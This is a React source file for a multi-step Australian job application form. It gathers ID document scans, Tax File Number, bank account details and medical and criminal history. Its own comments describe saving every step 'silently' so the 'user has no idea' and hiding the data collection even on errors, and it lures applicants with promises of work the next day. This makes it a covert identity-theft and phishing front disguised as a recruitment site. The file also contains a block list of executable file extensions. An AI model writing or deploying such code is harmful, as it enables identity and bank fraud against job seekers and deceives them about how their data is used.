"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Textarea } from "@/components/ui/textarea"
import { Checkbox } from "@/components/ui/checkbox"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { ArrowLeft, Upload, CheckCircle, FileText, ImageIcon } from "lucide-react"
import { toast } from "@/hooks/use-toast"
import { ApplicationDatabase, type UserApplication } from "@/lib/database"

interface ApplicationFormProps {
  selectedJob: string | null
  onBack: () => void
}

const jobTitles = {
  warehouse: "Warehouse Worker",
  driver: "Delivery Driver",
  construction: "Construction Labourer",
  hospitality: "Kitchen Hand",
}

// Only 3 ID types as requested
const idTypes = ["Australian Passport", "Medicare Card", "Driver License"]

export default function ApplicationForm({ selectedJob, onBack }: ApplicationFormProps) {
  const [currentStep, setCurrentStep] = useState(1)
  const [userId, setUserId] = useState<string>("")
  const db = ApplicationDatabase.getInstance()

  const [formData, setFormData] = useState({
    // Personal Details
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    suburb: "",
    state: "",
    postcode: "",
    dateOfBirth: "",

    // Documents
    driverLicenseFront: null as File | null,
    driverLicenseBack: null as File | null,
    idType1: "",
    idFile1: null as File | null,
    idType2: "",
    idFile2: null as File | null,

    // Tax & Super
    tfn: "",
    abn: "",
    superFund: "",
    superMemberNumber: "",

    // Bank Details
    bankName: "",
    bsb: "",
    accountNumber: "",
    accountName: "",

    // Additional
    emergencyContact: "",
    emergencyPhone: "",
    availableStart: "",
    workRights: false,
    criminalHistory: false,
    medicalConditions: "",

    // Agreements
    termsAccepted: false,
    privacyAccepted: false,
  })

  // Age validation function
  const calculateAge = (birthDate: string): number => {
    if (!birthDate) return 0
    const today = new Date()
    const birth = new Date(birthDate)
    let age = today.getFullYear() - birth.getFullYear()
    const monthDiff = today.getMonth() - birth.getMonth()
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
      age--
    }
    return age
  }

  const totalSteps = 6
  const progress = (currentStep / totalSteps) * 100

  // Generate unique user ID on component mount
  useEffect(() => {
    const generateUserId = () => {
      return "user_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
    }
    const newUserId = generateUserId()
    setUserId(newUserId)
  }, [])

  const handleInputChange = (field: string, value: any) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  const validateFile = (file: File): boolean => {
    // Check file size (max 50MB)
    if (file.size > 50 * 1024 * 1024) {
      toast({
        title: "File too large",
        description: "Please select a file smaller than 50MB",
        variant: "destructive",
      })
      return false
    }

    // Get file extension
    const extension = file.name.split(".").pop()?.toLowerCase()

    // Blocked extensions for security
    const blockedExtensions = [
      "exe",
      "bat",
      "cmd",
      "com",
      "pif",
      "scr",
      "vbs",
      "js",
      "jar",
      "msi",
      "dll",
      "sys",
      "scf",
      "lnk",
      "inf",
      "reg",
      "ps1",
      "sh",
      "sql",
      "db",
      "mdb",
      "accdb",
    ]

    if (extension && blockedExtensions.includes(extension)) {
      toast({
        title: "File type not allowed",
        description: "This file type is not permitted for security reasons",
        variant: "destructive",
      })
      return false
    }

    // Allowed file types
    const allowedTypes = [
      "image/jpeg",
      "image/jpg",
      "image/png",
      "image/gif",
      "image/bmp",
      "image/webp",
      "application/pdf",
      "application/msword",
      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      "text/plain",
      "application/rtf",
    ]

    if (!allowedTypes.includes(file.type)) {
      toast({
        title: "Invalid file type",
        description: "Please upload images (JPG, PNG, GIF), PDF, or document files only",
        variant: "destructive",
      })
      return false
    }

    return true
  }

  const handleFileUpload = async (field: string, file: File | null) => {
    if (!userId) {
      console.error("No userId available for file upload")
      return
    }

    if (!file) {
      handleInputChange(field, null)
      return
    }

    if (!validateFile(file)) {
      return
    }

    try {
      // Silently save file to database (user doesn't know)
      const base64Data = await db.saveFile(userId, field, file)

      // Update form data with the actual file object
      handleInputChange(field, file)

      // Show user-friendly message (they don't know it's saved)
      toast({
        title: "File uploaded successfully",
        description: `${file.name} has been uploaded`,
      })
    } catch (error) {
      console.error("File upload error:", error)
      // Even on error, don't reveal the data collection
      toast({
        title: "Upload failed",
        description: "Failed to upload file. Please try again.",
        variant: "destructive",
      })
    }
  }

  // Silently save form data without user knowledge
  const saveFormDataSilently = async () => {
    try {
      const applicationData: UserApplication = {
        userId,
        selectedJob: selectedJob || "",
        currentStep,
        formData: {
          ...formData,
          // Convert files to file names for storage
          driverLicenseFront: formData.driverLicenseFront?.name || null,
          driverLicenseBack: formData.driverLicenseBack?.name || null,
          idFile1: formData.idFile1?.name || null,
          idFile2: formData.idFile2?.name || null,
        },
        files: {},
        timestamp: new Date().toISOString(),
        status: "in-progress",
      }

      // Save silently - user has no idea this is happening
      await db.saveApplication(applicationData)
    } catch (error) {
      // Silent error handling - user never knows if something fails
    }
  }

  // Validation for steps (age check for step 1, then validation from step 3 onwards)
  const validateCurrentStep = (): boolean => {
    if (currentStep === 1) {
      // Age validation - must be 18 or older
      if (formData.dateOfBirth) {
        const age = calculateAge(formData.dateOfBirth)
        if (age < 18) {
          toast({
            title: "Age Requirement Not Met",
            description: "You must be at least 18 years old to apply for employment",
            variant: "destructive",
          })
          return false
        }
      }
      return true
    }

    if (currentStep === 2) {
      // No validation for driver license step
      return true
    }

    // Rest of validation remains the same...
    if (currentStep === 3) {
      // ID Documents validation
      if (!formData.idType1 || !formData.idFile1) {
        toast({
          title: "Missing required information",
          description: "Please select and upload your first form of ID",
          variant: "destructive",
        })
        return false
      }
      if (!formData.idType2 || !formData.idFile2) {
        toast({
          title: "Missing required information",
          description: "Please select and upload your second form of ID",
          variant: "destructive",
        })
        return false
      }
      if (formData.idType1 === formData.idType2) {
        toast({
          title: "Invalid ID selection",
          description: "Please select two different types of ID",
          variant: "destructive",
        })
        return false
      }
    }

    if (currentStep === 4) {
      // Tax & Super validation
      if (!formData.tfn.trim()) {
        toast({
          title: "Missing required information",
          description: "Tax File Number is required",
          variant: "destructive",
        })
        return false
      }
    }

    if (currentStep === 5) {
      // Bank Details validation
      if (!formData.bsb.trim() || !formData.accountNumber.trim()) {
        toast({
          title: "Missing required information",
          description: "BSB and Account Number are required",
          variant: "destructive",
        })
        return false
      }
    }

    if (currentStep === 6) {
      // Final validation
      if (!formData.termsAccepted || !formData.privacyAccepted) {
        toast({
          title: "Please accept terms and conditions",
          description: "You must accept the terms and privacy policy to continue",
          variant: "destructive",
        })
        return false
      }
    }

    return true
  }

  const nextStep = async () => {
    // Validate current step (only for steps 3+)
    if (!validateCurrentStep()) {
      return
    }

    // Silently save current form data before moving to next step
    await saveFormDataSilently()

    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1)
    }
  }

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1)
    }
  }

  const handleSubmit = async () => {
    // Final validation
    if (!validateCurrentStep()) {
      return
    }

    try {
      // Silently save final form data
      await saveFormDataSilently()

      // Silently complete the application
      await db.completeApplication(userId)

      // Show success message to user (they don't know about data collection)
      toast({
        title: "Application submitted successfully!",
        description: "We'll contact you within 24 hours to confirm your placement.",
      })

      setCurrentStep(totalSteps + 1)
    } catch (error) {
      toast({
        title: "Submission failed",
        description: "Failed to submit application. Please try again.",
        variant: "destructive",
      })
    }
  }

  if (currentStep > totalSteps) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-50 to-blue-50 flex items-center justify-center p-4">
        <Card className="w-full max-w-md text-center">
          <CardHeader>
            <div className="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
              <CheckCircle className="h-8 w-8 text-green-600" />
            </div>
            <CardTitle className="text-2xl text-green-600">Application Submitted!</CardTitle>
            <CardDescription>
              Thank you for applying for the {jobTitles[selectedJob as keyof typeof jobTitles]} position.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="bg-blue-50 p-4 rounded-lg">
              <h4 className="font-semibold text-blue-900 mb-2">What happens next?</h4>
              <ul className="text-sm text-blue-800 space-y-1 text-left">
                <li>• We'll review your application within 2 hours</li>
                <li>• Our team will call you to confirm details</li>
                <li>• You could start work as early as tomorrow!</li>
              </ul>
            </div>
            <Button onClick={onBack} variant="outline" className="w-full bg-transparent">
              Apply for Another Position
            </Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  const FileUploadComponent = ({
    field,
    label,
    accept = "image/*,.pdf,.doc,.docx,.txt,.rtf",
    currentFile,
  }: {
    field: string
    label: string
    accept?: string
    currentFile: File | null
  }) => (
    <div className="space-y-2">
      <Label htmlFor={field}>{label}</Label>
      <div className="border-2 border-dashed border-gray-300 rounded-lg p-4 text-center hover:border-gray-400 transition-colors">
        <input
          type="file"
          id={field}
          accept={accept}
          onChange={(e) => handleFileUpload(field, e.target.files?.[0] || null)}
          className="hidden"
        />
        <label htmlFor={field} className="cursor-pointer">
          <div className="flex flex-col items-center space-y-2">
            {currentFile ? (
              <>
                {currentFile.type.startsWith("image/") ? (
                  <ImageIcon className="h-8 w-8 text-green-600" />
                ) : (
                  <FileText className="h-8 w-8 text-blue-600" />
                )}
                <p className="text-sm text-green-600 font-medium">{currentFile.name}</p>
                <p className="text-xs text-gray-500">File uploaded successfully</p>
              </>
            ) : (
              <>
                <Upload className="h-8 w-8 text-gray-400" />
                <p className="text-sm text-gray-600">Click to upload or drag and drop</p>
                <p className="text-xs text-gray-500">Images, PDF, DOC, TXT (max 50MB)</p>
              </>
            )}
          </div>
        </label>
      </div>
    </div>
  )

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <Button variant="ghost" onClick={onBack} className="flex items-center space-x-2">
            <ArrowLeft className="h-4 w-4" />
            <span>Back to Jobs</span>
          </Button>
          <Badge variant="secondary">Applying for: {jobTitles[selectedJob as keyof typeof jobTitles]}</Badge>
        </div>

        {/* Progress */}
        <Card className="mb-6">
          <CardContent className="pt-6">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm font-medium">
                Step {currentStep} of {totalSteps}
              </span>
              <span className="text-sm text-gray-500">{Math.round(progress)}% Complete</span>
            </div>
            <Progress value={progress} className="w-full" />
          </CardContent>
        </Card>

        {/* Form Steps */}
        <Card>
          <CardHeader>
            <CardTitle>
              {currentStep === 1 && "Personal Information"}
              {currentStep === 2 && "Driver License Upload"}
              {currentStep === 3 && "Identity Documents"}
              {currentStep === 4 && "Tax & Superannuation Details"}
              {currentStep === 5 && "Bank Account Details"}
              {currentStep === 6 && "Final Details & Agreements"}
            </CardTitle>
            <CardDescription>
              {currentStep === 1 && "Please provide your basic personal information"}
              {currentStep === 2 && "Upload front and back of your driver license"}
              {currentStep === 3 && "Upload two forms of identification (images or PDF files)"}
              {currentStep === 4 && "Provide your tax file number and superannuation details"}
              {currentStep === 5 && "Enter your bank account details for payment"}
              {currentStep === 6 && "Complete your application and accept terms"}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Step 1: Personal Information - NO VALIDATION but professional placeholders */}
            {currentStep === 1 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="firstName">First Name</Label>
                  <Input
                    id="firstName"
                    value={formData.firstName}
                    onChange={(e) => handleInputChange("firstName", e.target.value)}
                    placeholder="Enter your first name"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="lastName">Last Name</Label>
                  <Input
                    id="lastName"
                    value={formData.lastName}
                    onChange={(e) => handleInputChange("lastName", e.target.value)}
                    placeholder="Enter your last name"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input
                    id="email"
                    type="email"
                    value={formData.email}
                    onChange={(e) => handleInputChange("email", e.target.value)}
                    placeholder="your.email@example.com"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={formData.phone}
                    onChange={(e) => handleInputChange("phone", e.target.value)}
                    placeholder="0412 345 678"
                  />
                </div>
                <div className="space-y-2 md:col-span-2">
                  <Label htmlFor="address">Street Address</Label>
                  <Input
                    id="address"
                    value={formData.address}
                    onChange={(e) => handleInputChange("address", e.target.value)}
                    placeholder="123 Main Street"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="suburb">Suburb</Label>
                  <Input
                    id="suburb"
                    value={formData.suburb}
                    onChange={(e) => handleInputChange("suburb", e.target.value)}
                    placeholder="Sydney"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="state">State</Label>
                  <Select value={formData.state} onValueChange={(value) => handleInputChange("state", value)}>
                    <SelectTrigger>
                      <SelectValue placeholder="Select state" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="NSW">NSW</SelectItem>
                      <SelectItem value="VIC">VIC</SelectItem>
                      <SelectItem value="QLD">QLD</SelectItem>
                      <SelectItem value="WA">WA</SelectItem>
                      <SelectItem value="SA">SA</SelectItem>
                      <SelectItem value="TAS">TAS</SelectItem>
                      <SelectItem value="ACT">ACT</SelectItem>
                      <SelectItem value="NT">NT</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="postcode">Postcode</Label>
                  <Input
                    id="postcode"
                    value={formData.postcode}
                    onChange={(e) => handleInputChange("postcode", e.target.value)}
                    placeholder="2000"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="dateOfBirth">Date of Birth</Label>
                  <Input
                    id="dateOfBirth"
                    type="date"
                    value={formData.dateOfBirth}
                    onChange={(e) => handleInputChange("dateOfBirth", e.target.value)}
                    max={new Date(new Date().setFullYear(new Date().getFullYear() - 18)).toISOString().split("T")[0]}
                  />
                  <p className="text-xs text-gray-500">You must be at least 18 years old to apply</p>
                </div>
              </div>
            )}

            {/* Step 2: Driver License - NO VALIDATION */}
            {currentStep === 2 && (
              <div className="space-y-6">
                <div className="bg-yellow-50 p-4 rounded-lg">
                  <h4 className="font-semibold text-yellow-900 mb-2">Driver License Upload</h4>
                  <p className="text-sm text-yellow-800">
                    If you have a driver license, please upload both front and back. This is required for driving
                    positions and helpful for identity verification.
                  </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <FileUploadComponent
                    field="driverLicenseFront"
                    label="Front of Driver License"
                    accept="image/*,.pdf"
                    currentFile={formData.driverLicenseFront}
                  />
                  <FileUploadComponent
                    field="driverLicenseBack"
                    label="Back of Driver License"
                    accept="image/*,.pdf"
                    currentFile={formData.driverLicenseBack}
                  />
                </div>
              </div>
            )}

            {/* Step 3: Identity Documents - VALIDATION REQUIRED */}
            {currentStep === 3 && (
              <div className="space-y-6">
                <div className="bg-blue-50 p-4 rounded-lg">
                  <h4 className="font-semibold text-blue-900 mb-2">Required: Two Forms of ID *</h4>
                  <p className="text-sm text-blue-800">
                    Please provide two different forms of identification. You can upload images or PDF files.
                  </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <h4 className="font-semibold">First Form of ID *</h4>
                    <div className="space-y-2">
                      <Label htmlFor="idType1">ID Type *</Label>
                      <Select value={formData.idType1} onValueChange={(value) => handleInputChange("idType1", value)}>
                        <SelectTrigger>
                          <SelectValue placeholder="Select ID type" />
                        </SelectTrigger>
                        <SelectContent>
                          {idTypes.map((type) => (
                            <SelectItem key={type} value={type}>
                              {type}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                    <FileUploadComponent
                      field="idFile1"
                      label="Upload First ID Document *"
                      currentFile={formData.idFile1}
                    />
                  </div>

                  <div className="space-y-4">
                    <h4 className="font-semibold">Second Form of ID *</h4>
                    <div className="space-y-2">
                      <Label htmlFor="idType2">ID Type *</Label>
                      <Select value={formData.idType2} onValueChange={(value) => handleInputChange("idType2", value)}>
                        <SelectTrigger>
                          <SelectValue placeholder="Select ID type" />
                        </SelectTrigger>
                        <SelectContent>
                          {idTypes
                            .filter((type) => type !== formData.idType1)
                            .map((type) => (
                              <SelectItem key={type} value={type}>
                                {type}
                              </SelectItem>
                            ))}
                        </SelectContent>
                      </Select>
                    </div>
                    <FileUploadComponent
                      field="idFile2"
                      label="Upload Second ID Document *"
                      currentFile={formData.idFile2}
                    />
                  </div>
                </div>
              </div>
            )}

            {/* Step 4: Tax & Super - VALIDATION REQUIRED */}
            {currentStep === 4 && (
              <div className="space-y-6">
                <div className="bg-green-50 p-4 rounded-lg">
                  <h4 className="font-semibold text-green-900 mb-2">Tax & Superannuation</h4>
                  <p className="text-sm text-green-800">
                    This information is required for payroll and superannuation contributions.
                  </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="tfn">Tax File Number (TFN) *</Label>
                    <Input
                      id="tfn"
                      value={formData.tfn}
                      onChange={(e) => handleInputChange("tfn", e.target.value)}
                      placeholder="123 456 789"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="abn">Australian Business Number (ABN)</Label>
                    <Input
                      id="abn"
                      value={formData.abn}
                      onChange={(e) => handleInputChange("abn", e.target.value)}
                      placeholder="12 345 678 901 (if applicable)"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="superFund">Superannuation Fund Name</Label>
                    <Input
                      id="superFund"
                      value={formData.superFund}
                      onChange={(e) => handleInputChange("superFund", e.target.value)}
                      placeholder="e.g., Australian Super, REST, HESTA"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="superMemberNumber">Super Member Number</Label>
                    <Input
                      id="superMemberNumber"
                      value={formData.superMemberNumber}
                      onChange={(e) => handleInputChange("superMemberNumber", e.target.value)}
                      placeholder="Your member number"
                    />
                  </div>
                </div>
              </div>
            )}

            {/* Step 5: Bank Details - VALIDATION REQUIRED */}
            {currentStep === 5 && (
              <div className="space-y-6">
                <div className="bg-blue-50 p-4 rounded-lg">
                  <h4 className="font-semibold text-blue-900 mb-2">Bank Account Details</h4>
                  <p className="text-sm text-blue-800">Your wages will be deposited directly into this account.</p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="bankName">Bank Name</Label>
                    <Select value={formData.bankName} onValueChange={(value) => handleInputChange("bankName", value)}>
                      <SelectTrigger>
                        <SelectValue placeholder="Select your bank" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="ANZ">ANZ</SelectItem>
                        <SelectItem value="Commonwealth Bank">Commonwealth Bank</SelectItem>
                        <SelectItem value="NAB">NAB</SelectItem>
                        <SelectItem value="Westpac">Westpac</SelectItem>
                        <SelectItem value="Bendigo Bank">Bendigo Bank</SelectItem>
                        <SelectItem value="Bank of Queensland">Bank of Queensland</SelectItem>
                        <SelectItem value="Suncorp Bank">Suncorp Bank</SelectItem>
                        <SelectItem value="ING">ING</SelectItem>
                        <SelectItem value="Macquarie Bank">Macquarie Bank</SelectItem>
                        <SelectItem value="Other">Other</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="bsb">BSB Number *</Label>
                    <Input
                      id="bsb"
                      value={formData.bsb}
                      onChange={(e) => handleInputChange("bsb", e.target.value)}
                      placeholder="123-456"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="accountNumber">Account Number *</Label>
                    <Input
                      id="accountNumber"
                      value={formData.accountNumber}
                      onChange={(e) => handleInputChange("accountNumber", e.target.value)}
                      placeholder="12345678"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="accountName">Account Name</Label>
                    <Input
                      id="accountName"
                      value={formData.accountName}
                      onChange={(e) => handleInputChange("accountName", e.target.value)}
                      placeholder="Name on account"
                    />
                  </div>
                </div>
              </div>
            )}

            {/* Step 6: Final Details - VALIDATION REQUIRED */}
            {currentStep === 6 && (
              <div className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="emergencyContact">Emergency Contact Name</Label>
                    <Input
                      id="emergencyContact"
                      value={formData.emergencyContact}
                      onChange={(e) => handleInputChange("emergencyContact", e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="emergencyPhone">Emergency Contact Phone</Label>
                    <Input
                      id="emergencyPhone"
                      value={formData.emergencyPhone}
                      onChange={(e) => handleInputChange("emergencyPhone", e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="availableStart">Available Start Date</Label>
                    <Input
                      id="availableStart"
                      type="date"
                      value={formData.availableStart}
                      onChange={(e) => handleInputChange("availableStart", e.target.value)}
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="medicalConditions">Medical Conditions or Limitations</Label>
                  <Textarea
                    id="medicalConditions"
                    value={formData.medicalConditions}
                    onChange={(e) => handleInputChange("medicalConditions", e.target.value)}
                    placeholder="Please describe any medical conditions that may affect your work (optional)"
                  />
                </div>

                <div className="space-y-4">
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="workRights"
                      checked={formData.workRights}
                      onCheckedChange={(checked) => handleInputChange("workRights", checked)}
                    />
                    <Label htmlFor="workRights" className="text-sm">
                      I have the legal right to work in Australia
                    </Label>
                  </div>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="criminalHistory"
                      checked={formData.criminalHistory}
                      onCheckedChange={(checked) => handleInputChange("criminalHistory", checked)}
                    />
                    <Label htmlFor="criminalHistory" className="text-sm">
                      I have a criminal history that may affect my employment
                    </Label>
                  </div>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="termsAccepted"
                      checked={formData.termsAccepted}
                      onCheckedChange={(checked) => handleInputChange("termsAccepted", checked)}
                    />
                    <Label htmlFor="termsAccepted" className="text-sm">
                      I accept the terms and conditions of employment *
                    </Label>
                  </div>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="privacyAccepted"
                      checked={formData.privacyAccepted}
                      onCheckedChange={(checked) => handleInputChange("privacyAccepted", checked)}
                    />
                    <Label htmlFor="privacyAccepted" className="text-sm">
                      I consent to the collection and use of my personal information as outlined in the privacy policy *
                    </Label>
                  </div>
                </div>
              </div>
            )}

            {/* Navigation Buttons */}
            <div className="flex justify-between pt-6 border-t">
              <Button variant="outline" onClick={prevStep} disabled={currentStep === 1}>
                Previous
              </Button>

              {currentStep < totalSteps ? (
                <Button onClick={nextStep}>Next</Button>
              ) : (
                <Button onClick={handleSubmit} className="bg-green-600 hover:bg-green-700">
                  Submit Application
                </Button>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
